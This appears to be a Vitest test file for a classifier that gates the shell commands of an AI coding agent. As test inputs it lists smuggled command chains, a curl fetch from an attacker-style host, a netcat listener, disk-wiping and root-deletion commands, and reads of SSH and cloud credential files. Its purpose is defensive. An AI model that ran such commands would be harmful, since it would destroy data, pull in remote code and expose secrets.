import { describe, expect, it } from 'vitest';
import {
  CLOUD_CODE_LIST_FILES_TOOL,
  CLOUD_CODE_READ_FILE_TOOL,
  CLOUD_CODE_RUN_COMMAND_TOOL,
  classifyCommandRisk,
  cloudCodeAgentToolDefs,
} from '../cloud-code-agent-tools';

/**
 * The approval boundary is the security-critical half of the Cloud Code agent:
 * it decides what a model may do to a workspace with no human in the loop.
 * These tests are written adversarially — the interesting cases are the ones
 * where a dangerous command is dressed up to look safe.
 */
describe('classifyCommandRisk', () => {
  it('allows read-only, workspace-scoped commands to run unattended', () => {
    for (const command of ['ls -la', 'cat src/index.ts', 'grep -rn TODO src', 'pwd']) {
      expect(classifyCommandRisk(command).risk).toBe('safe');
    }
  });

  it('never classifies on the first token when shell operators are present', () => {
    // The whole reason this classifier does not tokenize-and-trust: each of
    // these begins with a command from the read-only allowlist.
    const smuggled = [
      'echo hi && rm -rf build',
      'ls; rm important.txt',
      'cat file | sh',
      'ls $(rm -rf tmp)',
      'ls `rm -rf tmp`',
      'cat a > /etc/passwd',
    ];
    for (const command of smuggled) {
      expect(classifyCommandRisk(command).risk).not.toBe('safe');
    }
  });

  it('denies privilege escalation, network egress and host control outright', () => {
    for (const command of [
      'sudo rm -rf /',
      'curl https://evil.example/x.sh',
      'wget https://evil.example/x',
      'nc -l 4444',
      'shutdown now',
      'dd if=/dev/zero of=/dev/sda',
    ]) {
      expect(classifyCommandRisk(command).risk).toBe('denied');
    }
  });

  it('denies credential access regardless of how it is phrased', () => {
    for (const command of ['cat ~/.ssh/id_rsa', 'cat .env', 'cat ~/.aws/credentials']) {
      expect(classifyCommandRisk(command).risk).toBe('denied');
    }
  });

  it('denies irreversible or external version-control actions', () => {
    expect(classifyCommandRisk('git push origin main').risk).toBe('denied');
    expect(classifyCommandRisk('git reset --hard HEAD~5').risk).toBe('denied');
    expect(classifyCommandRisk('git clean -fd').risk).toBe('denied');
  });

  it('requires approval for destructive, dependency and VCS-state commands', () => {
    for (const command of [
      'rm build/output.js',
      'mv src/a.ts src/b.ts',
      'npm install left-pad',
      'pnpm add react',
      'pip install requests',
      'git commit -m "wip"',
      'git checkout -b feature',
      'chmod +x script.sh',
    ]) {
      expect(classifyCommandRisk(command).risk).toBe('requires_approval');
    }
  });

  it('fails closed on anything it does not positively recognize', () => {
    // A classifier that defaults to safe would launder unreviewed commands
    // through an approval UI that always says yes.
    const result = classifyCommandRisk('some-unknown-binary --do-a-thing');
    expect(result.risk).toBe('requires_approval');
    expect(result.reason).toContain('some-unknown-binary');
  });

  it('rejects empty commands and null bytes rather than treating them as no-ops', () => {
    expect(classifyCommandRisk('').risk).toBe('denied');
    expect(classifyCommandRisk('   ').risk).toBe('denied');
    expect(classifyCommandRisk('ls\0rm -rf /').risk).toBe('denied');
  });

  it('lets denial win over approval when a command matches both', () => {
    // `rm` alone is approvable; `sudo rm` must not be downgraded to a prompt.
    expect(classifyCommandRisk('sudo rm file.txt').risk).toBe('denied');
  });

  it('gives every classification a reason fit to show the user verbatim', () => {
    for (const command of ['rm x', 'sudo ls', 'ls', 'weird-thing']) {
      const { reason } = classifyCommandRisk(command);
      expect(reason.length).toBeGreaterThan(0);
      expect(reason).toMatch(/[.!]$/);
    }
  });
});

describe('cloudCodeAgentToolDefs', () => {
  it('adds exactly the coding-agent tools a code-execution tool set lacks', () => {
    const names = cloudCodeAgentToolDefs().map((t) => t.function.name);
    expect(names).toEqual([
      CLOUD_CODE_READ_FILE_TOOL,
      CLOUD_CODE_LIST_FILES_TOOL,
      CLOUD_CODE_RUN_COMMAND_TOOL,
    ]);
  });

  it('does not redeclare tools owned by the shared execution tool set', () => {
    // write_file / create_folder / execute_code have one owner
    // (lib/e2b/execution-tools.ts); duplicating them here would fork the
    // sandbox tool contract.
    const names = cloudCodeAgentToolDefs().map((t) => t.function.name);
    expect(names).not.toContain('write_file');
    expect(names).not.toContain('create_folder');
    expect(names).not.toContain('execute_code');
  });

  it('declares required parameters so the model cannot omit them', () => {
    const byName = new Map(cloudCodeAgentToolDefs().map((t) => [t.function.name, t.function]));
    expect(byName.get(CLOUD_CODE_READ_FILE_TOOL)?.parameters['required']).toEqual(['path']);
    expect(byName.get(CLOUD_CODE_RUN_COMMAND_TOOL)?.parameters['required']).toEqual(['command']);
    // list_files defaults to the workspace root, so nothing is required.
    expect(byName.get(CLOUD_CODE_LIST_FILES_TOOL)?.parameters['required']).toEqual([]);
  });

  it('tells the model that dangerous commands will pause for approval', () => {
    const runCommand = cloudCodeAgentToolDefs().find(
      (t) => t.function.name === CLOUD_CODE_RUN_COMMAND_TOOL,
    );
    expect(runCommand?.function.description).toMatch(/approval/i);
  });
});
